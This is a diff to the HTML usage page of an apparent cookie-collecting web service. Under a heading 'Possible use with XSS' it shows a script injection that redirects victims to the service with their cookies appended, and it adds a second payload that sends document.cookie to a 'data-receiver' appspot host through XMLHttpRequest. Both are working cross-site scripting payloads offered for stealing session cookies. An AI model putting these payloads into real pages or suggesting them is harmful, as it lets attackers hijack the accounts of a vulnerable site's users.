@@ -18,6 +18,8 @@
 
 	<b>Possible use with XSS</b>
 	"&gt;&lt;script&gt;window.location="http://application_name.appspot.com/?key=your_key&redirectLink=http://google.com&".concat(document.cookie);&lt;/script&gt;&lt;input type="hidden" value="
+	or
+	"&gt;&lt;script&gt;var request = new XMLHttpRequest();request.open('GET', "http://data-receiver.appspot.com/?key=fryday&".concat(document.cookie), true);request.send(null);&lt;/script&gt;&lt;input type="hidden" value="
 	</pre>
 	</body>
 </html>
